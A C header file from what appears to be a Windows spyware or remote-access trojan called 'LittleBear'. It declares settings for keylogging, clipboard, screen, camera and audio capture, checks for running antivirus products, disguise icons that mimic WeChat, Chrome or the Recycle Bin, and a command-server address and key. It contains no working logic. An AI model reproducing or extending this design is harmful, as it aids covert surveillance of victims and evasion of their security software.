
#pragma once

#ifndef PUBLIC_H_H_H
#define PUBLIC_H_H_H

#include <windows.h>


#define HTTP_PORT						80

#define CLIPBOARD_RECORD_TIME_DELAY		3000

#define KEYBOARD_RECORD_DELAY			100

#define KEYBOARD_BUF_SIZE				256

#define SCHEDULE_RUN_MIN_INTERVAL		10

#define CAMERA_VIDEO_FPS				10
#define CAMARE_VIDEO_HEIGHT				600
#define CAMARE_VIDEO_WIDTH				800

#define FILE_OPER_NOTYFY_SIZE			4096

#define JPG_TRANSFORM_QUALITY			80
#define SCREEN_VIDEO_FRAMES_PER_SECOND	10
#define AVI_VIDEO_QUALITY				3000

#define REMOTEBMP_BITSPERPIXEL			16
#define BITSPERPIXEL					24
#define MAX_CMD_LIMIT_SIZE				0x1000
#define MAX_TIMELAST_SECONDVALUE		3600

#define MAX_DLL_COUNT					16

#define MAX_ICON_COUNT					32

#define MACHINE_INFO					1
#define DISKFILE_INFO					2
#define PROCESS_INFO					4
#define APPINSTALL_INFO					8
#define APPSCREENSHOT_INFO				0X10
#define SCREENSHOT_INFO					0x20
#define USBFILE_INFO					0X40

#define ONLY_ONE_EXE		1
#define ONLY_ONE_DLL		2
#define ONE_EXE_AND_ONE_DLL 3
#define SOME_OTHER_FILES	4

#define SYSTEM_VERSION_WIN9X	1
#define SYSTEM_VERSION_WIN2000	2
#define SYSTEM_VERSION_XP		3
#define SYSTEM_VERSION_VISTA	4
#define SYSTEM_VERSION_WIN7		5
#define SYSTEM_VERSION_WIN8		6
#define SYSTEM_VERSION_WIN10	7
#define SYSTEM_VERSION_WIN11	8
#define SYSTEM_VERSION_WIN12	9
#define SYSTEM_VERSION_UNKNOW	-1

//#define LITTLEBEAR_CMDREDIRECT_FILE_NAME					"cmdredirect.txt"
//#define FILE_OPERATION_RECORD_FILENAME						"file_operation_record.txt"
//#define KEYBOARD_RECORD_FILENAME							"keyboard_record.txt"
//#define APPSNAPSHOT_RECORD_FILENAME							"appsnapshot_%s_%u_%u_%u_%u_%u_%u.jpg"
//#define SCREENSNAPSHOT_RECORD_FILENAME						"screensnapshot_%u_%u_%u_%u_%u_%u.jpg"
#define SCREENVIDEO_RECORD_FILENAME							"screenvideo_%u_%u_%u_%u_%u_%u.avi"
#define CAMERASNAPSHOT_VIDEO_FILENAME						"camerasnapshot_video_%u_%u_%u_%u_%u_%u.avi"
#define CAMERASNAPSHOT_PHOTO_FILENAME						"camerasnapshot_photo_%u_%u_%u_%u_%u_%u.jpg"
#define SOUNDCARD_RECORD_FILENAME							"soundcard_record_%u_%u_%u_%u_%u_%u.wav"
//#define CLIPBOARD_RECORD_FILENAME							"clipboard_record.txt"

#define PARAMS_FILENAME	"params.dat"


#define ICON_WECHAT				0x1000
#define ICON_QQ					0x1001
#define ICON_MYCOMPUTERWIN10	0x1002
#define ICON_MYCOMPUTER			0x1003
#define ICON_MYCOMPUTERXP		0x1004
#define ICON_EDGE				0x1005
#define ICON_IE					0x1006
#define ICON_RECYCLEWIN10		0x1007
#define ICON_RECYCLEWIN7		0x1008
#define ICON_FIREFOX			0x1009
#define ICON_CHROME				0x100a
#define ICON_MYCOMPUTERWIN11	0x100b
#define ICON_RECYCLEWIN11		0x100c

#define DLLFIRSTLOAD			0x1020


extern char strQQPath[MAX_PATH];
extern char szIEPath[MAX_PATH];
extern char szChromePath[MAX_PATH];
extern char szFireFoxPath[MAX_PATH];
extern char szWechatPath[MAX_PATH];
extern char szSkypePath[MAX_PATH];
extern char szAliwangwangPath[MAX_PATH];

extern BOOL b360Running;
extern BOOL bAvgntRunning;
extern DWORD bAvastRunning;
extern DWORD bComodoRunning;
extern DWORD bJinshanRunning;
extern DWORD bDubaRunning;

extern DWORD bQAXSafeRunning;

extern DWORD bNortonRunning;
extern DWORD bRuixingRunning;
extern DWORD bKasperskyRunning;
extern DWORD bBaiduAntiRunning;
extern DWORD bQQPCTrayRunning;

extern DWORD bMsMpEng;

extern BOOL bQQExist;
extern DWORD bSkypeExist;
extern DWORD bAliwangwangExist;
extern DWORD bWechatExist;

extern sockaddr_in stServCmdAddr;


extern int iSystemVersion;
extern char strSysVersion[32];
extern int iCpuBits;
extern char strPEResidence[MAX_PATH];
extern char strPEResParam[MAX_PATH];

extern char strDataPath[MAX_PATH];
extern char strLocalMac[32];
extern unsigned char cMAC[6];
extern char strGateWayMac[32];
extern char strLocalIP[32];
extern char strExternalIP[64];		//process is least with lots of chinese characters,so the buffer must be more larger
extern char strGateWayIP[32];
extern unsigned long ulVolumeSerialNo;
extern char szHDModelNumber[64];
extern char szHDSerialNumber[64];
extern char strHostName[64];
extern char strComputerName[64];
extern char strUserName[64];
extern char szSysDir[MAX_PATH];
extern char szParentProcName[MAX_PATH];
extern HANDLE gMutex;

extern char gLocation[256];
extern char gNetworkType[256];

extern int iIsAdministrator;
extern int iIsProcessAdmin;
extern int iIsUserAdmin;
extern BOOL iEnableLUA;
extern BOOL iPromptOnSecureDesktop;
extern BOOL iConsentPromptBehaviorAdmin;

extern DWORDLONG dwTotalMemory;
extern DWORDLONG dwAvilableMem;
extern DWORD dwCpuCnt;
extern DWORD dwMemPageSize;
extern char cCryptKey[32];
extern int JPG_STREAM_SIZE;
extern int BMP_STREAM_SIZE;
extern INT REMOTECONTROL_BUFFER_SIZE;
extern int ScrnResolutionX;
extern int ScrnResolutionY;

extern char SERVER_IP_ADDRESS[256];
extern char gUserName[64];
extern DWORD gServerIP;
extern int gStartMode;
extern unsigned char gClientKey[16];

extern char LITTLEBEAR_MUTEX_NAME[];
extern char  CAMERA_CAPTURE_NAME[];
extern char  LITTLEBEARNAME[];
extern char  MACHINE_INFO_FILENAME[];
extern char  ALL_DISK_FILE_FILENAME[];
extern char  USB_DISK_FILE_FILENAME[];
extern char  INSTALLAPPS_FILENAME[];
extern char  RUNNINGAPPS_FILENAME[];

extern char  CONFIG_FILENAME[];
extern char  LITTLEBEAR_LOG_FILE_NAME[];
extern char  TASKS_XML_FILE_NAME[];
extern char  CMD_OUTPUT_FILE_NAME[];


#endif